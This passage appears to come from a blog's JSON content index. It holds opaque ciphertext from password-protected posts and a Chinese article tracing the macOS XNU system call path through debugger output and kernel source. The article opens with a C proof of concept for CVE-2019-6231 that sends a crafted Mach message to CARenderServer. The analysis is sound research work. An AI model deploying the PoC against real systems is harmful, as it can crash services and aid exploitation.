+hZ4lipKCX9+sYvDh19eEZUBgi7QwvAmY4iWi+0kalAQC33FR8zCWiuX/kLAI/4ztLxLXITIzM8PJtPwbpVfRt9R9ZP+l8dYsvIFU07gKJCrpj2Gr10/TixivFDfI3Eicu3h5bPQ9+8TkAfvw6XhwiT1fMiceQw3LaxUpKzwP/xG0RNEy+mgkxHieebpZcWUy/EiCNfI8OFruhWQ2cOEeESNVoUMhnxM+2HHSCfJhd2qOge36mIVjtdseBLVMkpgg8E+VbOaN2OWnLPVCc/8R6jHsca78aztBKzsxzt7UGcGiAwnIWci/y0LpW4FjvKujVykggGGs0RkI1qJdDYpEJZJWEhR3h4aDRvnPUMdV5xQquWakRS586lnEAx5UN9wp7zQ6Owsp3Uicyup8/ZD0m9xJKo4w5YtQZ0sCV3arkxLJ4xkyah1yolxlf3GlNOPcYA2kd77oynqzKLAYl04f0s8Jt9A0bIrWlWqt8Qs0w/zLnUPSZ5n2In49cI1dJO20+asXgGzAuTqZWZHaEaECkwfXGE5Rb4tJBDbzeE4x/WrFLQsNhuZNlmPorUlQGRmZ/7XE/nzdhoPir/d9mx1tdtzxSnC88wWF12prqvUmNeTIcmcxFNdRD3gdZGcxB7aX7UZF1TS4N02Amih2m1XXXhKzPQyHkThyNhOQoc46bCN5UFxPJ1ccXRSV5z8JUDZj1t6vZPVC2RvUq/2Ol291VNF1dBKZm5PlHGMuKRq8sMwFVBiZ6LS3wt4ReTQb4bo1wl1LObrFWmXlcZIjp7EeTD7PCS3hxpxNqxEe9sEdb9U0MfBsJ074uIibq3Y/1+8kVvfdgVBaWmybV/FPCFmfq2I0V4Cg9VLIi52uxauiuYfQq9LJs6wxGga6nO0Pl2EAbRPagNSTqxO6G5ccBLXdlk8NYNZClSCOX5C3avToM9M21ShrwlMO2iaR5Jzstb6jx+Ae1M8RSk30RRb+F25nVXi0qrcvvAQb34CmUvRzGn6ENfEOKjdPjnRvHCFWmM7WLzeQcjNQ4aYZ/TIkcVAOYkPbGp7Ic3bUYqbm/bvkE9tgB1Byrbh/1B2BIVZk/xBnzSdTXb5x1nkaZDgL7iniw3UZ7cckfu4JX2c2erCaLhc7uZQv4/zL1m7+GvyrHzguqqt0In00aUuPjNe9Zu8MlT6hE5bIrFO/S6SaTRwjVsAenxCNdmLjFnefZXvIA7oPg/+RES1Fog/hRSrWnLM4XoOylPBVYLwU63fW8PmW//nhQfp0CCvNsYUFQytKoIDYAJ+kE6wNQDAIDFqcPoGsk7/KqxjKIggJh8QYo7vbsczh6sbj+/y5aifkgwvz3k5jORcRilpO9SphZbaSraMvwqkHOOAzITghSVzm2u/zIIM/PUGBzla7XU3WB8q5zlBCXkjY62ktuPITqy0RI1c/4jIOj0ux2PiEsQnEtrl3cAvyC+9maw7ToyH7CinzxapX2dFRHXceSehsTM0pTvnznvyN6/inJBiV3Ejtt6ffcfxBK1D0IDhOVkP6TxFs3OpwGvN6oHKVB21A+gzeK7V94lYkKZN/zlMJwPG80QT7JtRA9QiMsIbrjEBBEJX2zvvfr6CICaKA9rilh/K5NGpmg3tG/ANaW54TblF2S0RYTmitI4kiP0NN2ZmsfB76VFaHH2qDXk6Xw3Mh9gYn0NmhMdxX2bekCvIG/dZDhSWKsoEsZ3RW8qDvXd2vOxYp9uyckG/cD9esxm1bR3uO4pLixjchr8FderNRzkJbNf0gZeDmC6eum6RhJb6dLIiISyGk5WLbjE9FDb7KO87a6UBpo9pPpoVZBNn4MSelWQZmNk3RwDo9C4iLeiaafCyY5fyNn/bEezebKNqomiIut5de302ayi4d4PXVZag5vauYGJSMvlYsEx+Zj+ksQuJsskFdODkwaXIPO5ifyrVqxkrLRK0KWD1tiaJZE2dM7zY3wEHOpyu0iRzk14G5bNH75yV+xKaPJTluAmDtMYhSNB/iG/o+5h1bDLqwC/U4gfSfpQWCNcoOQUAYKZVzIYLhAE/GPSIDjLiFMy+cz7PSN3lTBfxcbCM+2ZqhIGvC79dbdZggKKxbmjkcmkty4l6iH/sTJ7mIm8PK3k5S848ES4ftNOEN9CvVcMFRUSpXQmbp8vZKCnD/bpzFmNr46n0jZT5x5GN/uDVGN11Dl2P/BQUTWqBdxmMOZNy0tGC1/NmqYAClszTA55M8tJ0g1wmvkNdSRrbgDJWUGwoy8QFrtJbTH+WJA+um+pcEc3bNGVeGpGbSsopNvfvdLAjLWnQYwi2I0NnJI8i15TMPvLG7KcW7iaNQEc3lYJE4J981klVKIWjU5oUIVY97Lov2Y+fo7NM0SKxepjcx4G74lPAAauI2ah/gx8dgnxwmkKdc0vQRbrFfuDKNKYJ/bs5tilx/KCPdGXxbFc8gpIDkQNzHGxV0kKduubh68Q2h98neKqwZZTa6O3MB0aseq9rOhra7WWenhNEOqAEjdAGC98sEu4Fuh+EW19kOYz1QXWjrPT/Si39yvei+EiTePA5NyKGW/2ts/6xaqRrCDMDAr1fr2kVW2KzAhVjHHwg8C7O+tDn4eO8VdPzXp5JAWD4BIINXwRJKryZCWSmsyj2Ruw31wCQHZ0+mvyEYUDHJZZvaNp1GSq2L15/t+WzOWZY8Yjr4rUbknyGQFLlQI9w62S2jIfP+U7PtqjV4avmqheixejcnZsFxgNHHODFC0Lmaj5WhjIY3fUweIMa3hesyVa7MENiP/xzuqtGJo3zbwRkuEjG6Itudg56pYqZdciiE/HwNzsn8mphiZZ11/O+O+h8xJu7Ul+icRTatOLodVbYrFj/0QvlNCFMp5iHCKJQD42dg+X1zFL0rikNjE6hyXUSVzf/46tNFFCfgDNYXH+Lngrf3vNPpyTxnTimksCyUz4cw9GcmP1M76VumD2iTTEKbao7MROL2DEJ9NS3v6kICPAh5KOGx6fHjnFgBx9beK85j9sat/GofnaKXhPWxMVg+5Ia/HB3AkktVnKM0AGGPS+XqPK8qvs2Wo+NMCNV5XQ5CdRja5IPbRveALDT4rbLGp/Xyy9ow1luKAql5BpnPuN9bb3z+MD7L5eoSM9+sqmt/smAvjENLTviX7AysNuHxuAxeCOv0bZxZxNecliMwwDA47tOM0caJMXbw8EyKupd8Iz07VlzppiF1FjF0LhFI4fxVfGeVQZSIPGVZ8w36m3HRwtNgBndAU34loGEwsdbk1GCZ6GLC8XfZtMZ++nB37XxenGUc2+Ck5QJkK5dmD0TKBhVtc+6icFJXONafFEhJCIZmUZuODi+SeVSIzpt5Bzv3n7GohaZfd2Eck8vn0Q4fqnsEkA/tlNp8KzE0ZkIR8X9g9vT8CG9SLYekt4QkVeydFEVhDH6bsHa8N5DmXeQN+I6Jg/r2Ns22wadJsWAY8vwpER0alM3fju0brFFzJchSmxo3vufYbLNoPdtp7L86dSWysvsBhWgCraEiUZf2wCt0I7SIPCz9afXhNlEa/Q4UzXAq17FYULxaZ6AWnhGTuBP8tmG0gRYDXcnX44YEpVESLAYj+6NXmRGmxE/D6Jhwfks3I4ZtWVZDAalGYQi4y1TUN4F2PsNIawFITH/J90iO/VaYtqdQOx9SYOPYyr7UwNKC0msiaaMe4YZwJPme6xokFK85lo4FfGkxHa43leX+KAIgyy9hC5WRzJM7AJudOeURyJsU7eYnIdlko8f/As8O8qdtv8NZ7TacX7BHmYXZPemEELNcj6y8ORAgYb+fWGSCbfIPZXheYRQ4+S2cyF5+kMoGYae7yHPCBfN/S8XqpTS/sR8TScExXK4PUCSrwPyXGlmZ/I3oscRDJd+q8uapW76P81f61ZIOB5iFbBWZ+pnBDW3bGaiBBkig+qudkuvyqUFO2MEEpm5li1S2iGxjD+1jUB5fsLC8f2QuP1uEaQONriKrUiZc6M9bUwFYAT18DEFtsWumsto14dw6x9l40waCO8TYdRbFEZg+NnpVKquCxDAuPhaFx+TZYYYaSONtwHM1GztoI/Xnq8P/PW3o/3ZmYxlU2f7zA28UyCYEOaPH8fR3l9FzCPlX79qExxf+yD0pvZOv1sFbGIPuDC6Vt2Vih3SjNWlpMsKslnkINgLFgpQWra2+nBQfYBo6AN5S/NAa/fYwqxSZzNDG8eiGxzZAR2sy1E+8M5s9sakMFRlq5Ca7mhM+E7J5kIgDHRCjONyz8JlSef1CSmQUQjLC+rdCuLGsN56hYSQ04HEFcupvTNT6EJEVpbExMFRcG7JUPXpdI2l/x8utC+N31s6I+kl7IT2oI9c9rJGRH7PdLkALdDO6i9hZoV9/L3c8xdLNWe0yYd1Jt/k+CR6BLhcN4NStnZDwvvSIihZMJDTJ2kyooJrZdAV7FVCJTPpAxL9v3mRBHMqyMADrEHvKwtSaMt6iVdHRABPzqeV2+I7BmLTfERmzpAtP6u8spIWf+dPf6E9II3Pj8oi9IxnNsuehZv+7Jldgs2uVfNImJnkFJXkM9PRft+MM3aJ8mkaOGUtXAjzSmr3EtZoQzQnXmpvE1QaH/2UlT2MVSWqEm3m+sWZkbNygJWmeXdmg2z7kssBQwzXp1sqSfaowZUv5wgV9MlnPHkFsl9pOmxYOrC1XYOnIQnwDWwm0duiomdQegGTX4u7XpNDZ7s8iywhCC3grTT1lBzTtfI+NIKNcqCpYVtnnP80LSeSaDppLeodbkGygg0APTIYA4TZmJhJEt20S7ulU2Fy9muFjP1GqFNlNf1uH0qOnjeHHIPaUSTO36+/O7sAVeA3+YqKrsx8kzMWU7MhlrQZA5kVoANpfSBippq2z55QKsbnmmOUQJHpvyg40khoCBgOdP8zyVlXIy5AmV1E+W5l1iyVaD9eDTA/4adgNzBBjmQ1zo/rwEVBgBJt36Cwug9oDxiKaNqwxt3yxLluNrvqwZnPtf8MzjJs6vK6SFmlSMIpCQBEYTmOGCt3FFJF+MQb7KIQ39NsHov+Vc5eFbpsgpWOrSVCoZV7EqlOMvJ30DBsWHnvOMOySXNZWhVjqnI3kW6sfBaCowOGanVXGbfyOGlVK1OezzqtO9PbgQ5QqaMt0EoeJhl6ypPKgO5FCdTIGiKUbe28R1w15DmqIptU/bQLpILrkQVR5WhiiWFQTQx3mvMKZ2eKcd1KVKE20AC+xa2NEiyaHhIlnruMiwEyBAJ0ozuzPkKhh+At2gdxsS4fqM4JElVbrvOVD2LYA7tSaE1Bq8j3bbKQm/G4DsQw65YLEc31OIH/","tags":[]},{"title":"1amb4ck","date":"2019-03-05T15:26:30.000Z","path":"2019/03/05/1amb4ck/1amb4ck/","text":"Need password to decrypt! Incorrect Password! No content to display! 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","tags":[]},{"title":"XNU系统调用深度解析","date":"2019-01-30T05:53:00.000Z","path":"2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/","text":"XNU系统调用深度解析 从一个函数分析到系统调用的内核实现 由一段POC而起#include &lt;stdio.h&gt; #include &lt;mach/i386/kern_return.h&gt; #include &lt;mach/mach_traps.h&gt; #include &lt;servers/bootstrap.h&gt; #include &lt;dirent.h&gt; #include &lt;sys/stat.h&gt; #include &lt;time.h&gt; #include &lt;dlfcn.h&gt; #include &lt;unistd.h&gt; typedef struct quartz_register_client_s quartz_register_client_t; struct quartz_register_client_s { mach_msg_header_t header; uint32_t body; mach_msg_port_descriptor_t ports[4]; char padding[12]; }; typedef struct quartzcore_mach_msg quartzcore_mach_msg_t; struct quartzcore_mach_msg{ mach_msg_header_t header; char msg_body[712]; }; uint64_t get_filesize(const char *fn){ struct stat st; stat(fn, &amp;st); uint64_t fsize = st.st_size; return fsize; }; int main(int argc, const char * argv[]) { mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL; task_get_bootstrap_port(mach_task_self(), &amp;bs_port); const char *render_service_name = &quot;com.apple.CARenderServer&quot;; kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;); kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p); if (kr != KERN_SUCCESS) { return -1; } printf(&quot;[*] Get service of %s successully!\\n&quot;, render_service_name); quartz_register_client_t msg_register; memset(&amp;msg_register, 0, sizeof(msg_register)); msg_register.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX; msg_register.header.msgh_remote_port = p; msg_register.header.msgh_local_port = mig_get_reply_port(); msg_register.header.msgh_id = 40202; // _XRegisterClient msg_register.body = 4; msg_register.ports[0].name = mach_task_self(); msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[1].name = mach_task_self(); msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[2].name = mach_task_self(); msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[3].name = mach_task_self(); msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR; kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG, sizeof(quartz_register_client_t), sizeof(quartz_register_client_t), msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL); if (kr != KERN_SUCCESS) { return -1 ; } mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c); uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30); printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\\n&quot;,context_port,conn_id); char *crash_log = &quot;crash.data&quot;; //size is 736. FILE *fp = fopen(crash_log, &quot;rb&quot;); if(fp == NULL){ printf(&quot;fopen error!\\n&quot;); } uint64_t fsize = get_filesize(crash_log); void *msg_buf = malloc(fsize); memset(msg_buf, 0, fsize); fread(msg_buf, fsize, 1, fp); quartzcore_mach_msg_t qc_mach_msg = {0}; qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX; qc_mach_msg.header.msgh_remote_port = context_port; qc_mach_msg.header.msgh_id = 40002; memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body)); *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1; // Ports count memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc); *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id; kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL); if (kr != KERN_SUCCESS) { printf(&quot;[-] Send message failed: 0x%d\\n&quot;, kr); return -1 ; } return 0; } 里面的macho函数mach_msg()到底后面执行到哪里？于是展开一段追踪 从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。 * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1 frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msg libsystem_kernel.dylib`mach_msg: -&gt; 0x7fff79299694 &lt;+0&gt;: pushq %rbp 0x7fff79299695 &lt;+1&gt;: movq %rsp, %rbp 0x7fff79299698 &lt;+4&gt;: pushq %r15 0x7fff7929969a &lt;+6&gt;: pushq %r14 Target 0: (CVE-2019-6231-poc) stopped. 调试可以看出mach_msg实现在libsystem_kernel.dylib之中 (lldb) dis libsystem_kernel.dylib`mach_msg: -&gt; 0x7fff79299694 &lt;+0&gt;: pushq %rbp 0x7fff79299695 &lt;+1&gt;: movq %rsp, %rbp 0x7fff79299698 &lt;+4&gt;: pushq %r15 0x7fff7929969a &lt;+6&gt;: pushq %r14 0x7fff7929969c &lt;+8&gt;: pushq %r13 0x7fff7929969e &lt;+10&gt;: pushq %r12 0x7fff792996a0 &lt;+12&gt;: pushq %rbx 0x7fff792996a1 &lt;+13&gt;: subq $0x28, %rsp 0x7fff792996a5 &lt;+17&gt;: movl %ecx, %r13d 0x7fff792996a8 &lt;+20&gt;: movl %esi, %ebx 0x7fff792996aa &lt;+22&gt;: movq %rdi, %r14 0x7fff792996ad &lt;+25&gt;: movl 0x10(%rbp), %eax 0x7fff792996b0 &lt;+28&gt;: movl %ebx, %r12d 0x7fff792996b3 &lt;+31&gt;: andl $0xfffffbbf, %r12d ; imm = 0xFFFFFBBF 0x7fff792996ba &lt;+38&gt;: movl %eax, (%rsp) 0x7fff792996bd &lt;+41&gt;: movl %r12d, %esi 0x7fff792996c0 &lt;+44&gt;: movl %edx, %r15d 0x7fff792996c3 &lt;+47&gt;: movl %r8d, -0x2c(%rbp) 0x7fff792996c7 &lt;+51&gt;: movl %r9d, -0x30(%rbp) 0x7fff792996cb &lt;+55&gt;: callq 0x7fff79299170 ; mach_msg_trap ... mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify) { mach_msg_return_t result; // eax mach_msg_option_t v8; // er12 result = mach_msg_trap(); if ( !result ) return 0; if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 ) { do result = mach_msg_trap(); while ( result == 268435463 ); } v8 = option; if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 ) { do result = mach_msg_trap(); while ( result == 268451845 ); } return result; } 通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下 * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1 frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_trap libsystem_kernel.dylib`mach_msg_trap: -&gt; 0x7fff79299170 &lt;+0&gt;: movq %rcx, %r10 0x7fff79299173 &lt;+3&gt;: movl $0x100001f, %eax ; imm = 0x100001F 0x7fff79299178 &lt;+8&gt;: syscall 0x7fff7929917a &lt;+10&gt;: retq Target 0: (CVE-2019-6231-poc) stopped. 这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。 XNU内核系统调用流程系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过intel官方文档可以找到 SYSCALL invokes an OS system-call handler at privilege level 0. It does so by loading RIP from the IA32_LSTAR MSR 也就是内核需要将系统调用处理函数入口放到IA32_LSTAR model specific register. 在内核源码中对应在osfmk/i386/mp_desc.c的cpu_syscall_init(cpu_data_t *cdp)函数之中 /* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */ void cpu_syscall_init(cpu_data_t *cdp) { #if MONOTONIC mt_cpu_up(cdp); #else /* MONOTONIC */ #pragma unused(cdp) #endif /* !MONOTONIC */ wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS); wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter)); wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku); /* Enable syscall/sysret */ wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE); /* * MSRs for 64-bit syscall/sysret * Note USER_CS because sysret uses this + 16 when returning to * 64-bit code. */ wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall)); wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32)); /* * Emulate eflags cleared by sysenter but note that * we also clear the trace trap to avoid the complications * of single-stepping into a syscall. The nested task bit * is also cleared to avoid a spurious &quot;task switch&quot; * should we choose to return via an IRET. */ wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT); } wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));也就是系统调用会由hi64_syscall函数处理。这个函数实现在xnu/osfmk/x86_64/idt64.s之中 Entry(hi64_syscall) Entry(idt64_syscall) swapgs /* Use RAX as a temporary by shifting its contents into R11[32:63] * The systemcall number is defined to be a 32-bit quantity, as is * RFLAGS. */ shlq $32, %rax or %rax, %r11 .globl EXT(dblsyscall_patch_point) EXT(dblsyscall_patch_point): // movabsq $0x12345678ABCDEFFFULL, %rax /* Generate offset to the double-mapped per-CPU data shadow * into RAX */ leaq EXT(idt64_hndl_table0)(%rip), %rax mov 16(%rax), %rax mov %rsp, %gs:CPU_UBER_TMP(%rax) /* save user stack */ mov %gs:CPU_ESTACK(%rax), %rsp /* switch stack to per-cpu estack */ sub $(ISF64_SIZE), %rsp /* * Synthesize an ISF frame on the exception stack */ movl $(USER_DS), ISF64_SS(%rsp) mov %rcx, ISF64_RIP(%rsp) /* rip */ mov %gs:CPU_UBER_TMP(%rax), %rcx mov %rcx, ISF64_RSP(%rsp) /* user stack --changed */ mov %r11, %rax shrq $32, %rax /* Restore RAX */ mov %r11d, %r11d /* Clear r11[32:63] */ mov %r11, ISF64_RFLAGS(%rsp) /* rflags */ movl $(SYSCALL_CS), ISF64_CS(%rsp) /* cs - a pseudo-segment */ mov %rax, ISF64_ERR(%rsp) /* err/rax - syscall code */ movq $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp) movq $(T_SYSCALL), ISF64_TRAPNO(%rsp) /* trapno */ swapgs jmp L_dispatch /* this can only be 64-bit */ 继续跟下去，会得到如下执行流程 syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt; L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall /* * 64bit Tasks * System call entries via syscall only: * * r15 x86_saved_state64_t * rsp kernel stack * * both rsp and r15 are 16-byte aligned * interrupts disabled * direction flag cleared */ Entry(hndl_syscall) TIME_TRAP_UENTRY movq %gs:CPU_ACTIVE_THREAD,%rcx /* get current thread */ movl $-1, TH_IOTIER_OVERRIDE(%rcx) /* Reset IO tier override to -1 before handling syscall */ movq TH_TASK(%rcx),%rbx /* point to current task */ /* Check for active vtimers in the current task */ TASK_VTIMER_CHECK(%rbx,%rcx) /* * We can be here either for a mach, unix machdep or diag syscall, * as indicated by the syscall class: */ movl R64_RAX(%r15), %eax /* syscall number/class */ movl %eax, %edx andl $(SYSCALL_CLASS_MASK), %edx /* syscall class */ cmpl $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_mach_scall64) cmpl $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_unix_scall64) cmpl $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_mdep_scall64) cmpl $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_diag_scall64) /* Syscall class unknown */ sti CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1) /* no return */ hndl_syscall这个函数会系统调用分为hndl_unix_scall64 、hndl_mach_scall64、hndl_mdep_scall64、hndl_diag_scall64四类分别处理 这里以hndl_unix_scall64为列 Entry(hndl_unix_scall) TIME_TRAP_UENTRY movq %gs:CPU_ACTIVE_THREAD,%rcx /* get current thread */ movq TH_TASK(%rcx),%rbx /* point to current task */ incl TH_SYSCALLS_UNIX(%rcx) /* increment call count */ /* Check for active vtimers in the current task */ TASK_VTIMER_CHECK(%rbx,%rcx) sti CCALL1(unix_syscall, %r15) /* * always returns through thread_exception_return */ 这里调动了unix_syscall函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查 以及根据系统调用表去调用对应的实现 thread = current_thread(); uthread = get_bsdthread_info(thread); // regs is derrived from r15 ... code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK; callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code]; // ... vt = (void *)uthread-&gt;uu_arg; // ... memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi, args_in_regs * sizeof(syscall_arg_t)); // ... error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); 目前执行的流程如下 hi64_syscall L_dispatch_U64 L_dispatch_64bit L_common_dispatch hndl_syscall // rdx, pushed in hi64_syscall hndl_unix_scall64 unix_syscall64 error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there 参考https://www.binss.me/blog/interrupt-and-exception/ https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html 